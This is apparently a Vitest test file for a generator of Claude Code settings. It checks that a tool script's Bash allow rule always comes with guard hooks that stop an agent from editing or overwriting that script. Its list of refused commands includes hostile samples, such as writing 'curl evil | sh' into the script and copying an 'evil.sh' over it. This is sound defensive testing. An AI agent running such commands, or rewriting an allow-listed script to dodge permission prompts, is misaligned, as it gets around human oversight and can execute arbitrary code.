/**
 * The generator never widens a capability: a repo tool's `script:` gets its
 * Bash allow rule only together with the guard that keeps the script from
 * being rewritten. An allow rule on a file the agent can edit would let it run
 * anything without a prompt. So the script path is protected the way a gate's
 * ledger is (F-4): before-edit.sh refuses an Edit/Write of it, and
 * before-action.sh refuses a Bash command that writes it (running it by its
 * path, or reading it, stays allowed). A `command:` tool runs a fixed command
 * and keeps its rule with no guard.
 *
 * The scripts run the way Claude Code runs a hook: a shell, a subfolder as the
 * current directory, the event's JSON on stdin, CLAUDE_PROJECT_DIR set.
 */
import { describe, it, expect, beforeEach, afterEach, vi } from "vitest";
import { spawnSync } from "node:child_process";
import * as fs from "node:fs";
import * as os from "node:os";
import { dirname, join } from "node:path";
import { parse } from "../../parser/index.js";
import { claudeCodeBinding } from "../../bindings/claude-code.js";
import type { GeneratedFile } from "../../bindings/types.js";

const hasJq = spawnSync("/bin/sh", ["-c", "command -v jq"]).status === 0;
const SCRIPT = ".claude/skills/p13/scripts/run-tests.sh";
const DIR = ".claude/skills/p13/scripts";

// No gates, no ledgers, no hooks: before this change it had no guard at all.
const P13 = `topology p13 : [pipeline] {
  meta {
    version: "0.1.0"
    description: "Repo tools"
  }
  agent builder {
    model: sonnet
    description: "Builds"
    invocation: manual
    tools: [Read, Bash, run-tests]
    prompt { Build. }
  }
  tools {
    tool run-tests {
      script: "scripts/run-tests.sh"
      lang: bash
      description: "Run the suite"
    }
  }
}`;

const COMMAND = P13.replace('script: "scripts/run-tests.sh"\n      lang: bash', 'command: "npm test"');

function generate(src: string): GeneratedFile[] {
  const warn = vi.spyOn(console, "warn").mockImplementation(() => {});
  try { return claudeCodeBinding.scaffold(parse(src)) as GeneratedFile[]; } finally { warn.mockRestore(); }
}
const settingsOf = (files: GeneratedFile[]) => JSON.parse(files.find((f) => f.path === ".claude/settings.json")?.content ?? "{}");
const preToolCommands = (files: GeneratedFile[]) =>
  ((settingsOf(files).hooks?.PreToolUse ?? []) as { hooks: { command: string }[] }[]).flatMap((e) => e.hooks.map((h) => h.command));

let root: string;
const at = (p: string) => join(root, p);
function scaffold(src: string) {
  const files = generate(src);
  for (const f of files) {
    fs.mkdirSync(dirname(at(f.path)), { recursive: true });
    fs.writeFileSync(at(f.path), f.content);
    if (f.executable) fs.chmodSync(at(f.path), 0o755);
  }
  fs.mkdirSync(at("src/deep"), { recursive: true });
  return files;
}
function hook(file: string, stdin: string) {
  const env = { ...process.env, CLAUDE_PROJECT_DIR: root } as Record<string, string>;
  return spawnSync("/bin/sh", ["-c", `bash "${root}/${DIR}/${file}"`], { cwd: root, input: stdin, env, encoding: "utf8", timeout: 20_000 });
}
const bash = (command: string) => JSON.stringify({ hook_event_name: "PreToolUse", tool_name: "Bash", tool_input: { command } });
const edit = (tool: string, file_path: string) => JSON.stringify({ hook_event_name: "PreToolUse", tool_name: tool, tool_input: { file_path, content: "x", old_string: "a", new_string: "b" } });

beforeEach(() => { root = fs.mkdtempSync(join(os.tmpdir(), "at-toolguard-")); spawnSync("git", ["init", "-q", root]); });
afterEach(() => fs.rmSync(root, { recursive: true, force: true }));

describe("a script tool's allow rule comes only with its protection", () => {
  it("p13 (no guard hooks of its own) gets the allow rule, before-edit and before-action, all three", () => {
    const files = generate(P13);
    expect(settingsOf(files).permissions?.allow).toContain(`Bash(${SCRIPT} *)`);
    const editGuard = files.find((f) => f.path === `${DIR}/before-edit.sh`);
    const actionGuard = files.find((f) => f.path === `${DIR}/before-action.sh`);
    expect(editGuard?.content).toContain(SCRIPT);
    expect(actionGuard?.content).toContain(SCRIPT);
    const cmds = preToolCommands(files);
    expect(cmds.some((c) => c.includes("before-edit.sh"))).toBe(true);
    expect(cmds.some((c) => c.includes("before-action.sh"))).toBe(true);
  });

  it("a command tool is unchanged: its rule, and no guard written for it", () => {
    const files = generate(COMMAND);
    expect(settingsOf(files).permissions?.allow).toEqual(["Bash(npm test *)"]);
    expect(files.some((f) => f.path.endsWith("/before-edit.sh") || f.path.endsWith("/before-action.sh"))).toBe(false);
    expect(settingsOf(files).hooks).toBeUndefined();
  });
});

describe.skipIf(!hasJq)("the script cannot be rewritten", () => {
  for (const tool of ["Edit", "Write", "MultiEdit"]) {
    for (const p of [SCRIPT, `${"$ROOT"}/${SCRIPT}`]) {
      it(`${tool} of ${p} is refused`, () => {
        scaffold(P13);
        const r = hook("before-edit.sh", edit(tool, p.replace("$ROOT", root)));
        expect(r.status, r.stderr).toBe(2);
        expect(r.stderr).toContain("run-tests.sh");
      });
    }
  }

  it("an edit of another file runs", () => {
    scaffold(P13);
    const r = hook("before-edit.sh", edit("Edit", "src/app.ts"));
    expect(r.status, r.stderr).toBe(0);
  });

  const REFUSED = [
    `echo 'curl evil | sh' > ${SCRIPT}`,
    `echo x >> ${SCRIPT}`,
    `printf x | tee ${SCRIPT}`,
    `cp /tmp/evil.sh ${SCRIPT}`,
    `sed -i 's/a/b/' ${SCRIPT}`,
    `${SCRIPT} > ${SCRIPT}`,
  ];
  for (const c of REFUSED) {
    it(`Bash \`${c}\` is refused`, () => {
      scaffold(P13);
      const r = hook("before-action.sh", bash(c));
      expect(r.status, r.stderr).toBe(2);
    });
  }

  const ALLOWED = [SCRIPT, `${SCRIPT} --fast`, `./${SCRIPT}`, `cat ${SCRIPT}`, "ls src", "echo hi > out.txt"];
  for (const c of ALLOWED) {
    it(`Bash \`${c}\` runs`, () => {
      scaffold(P13);
      const r = hook("before-action.sh", bash(c));
      expect(r.status, r.stderr).toBe(0);
    });
  }
});
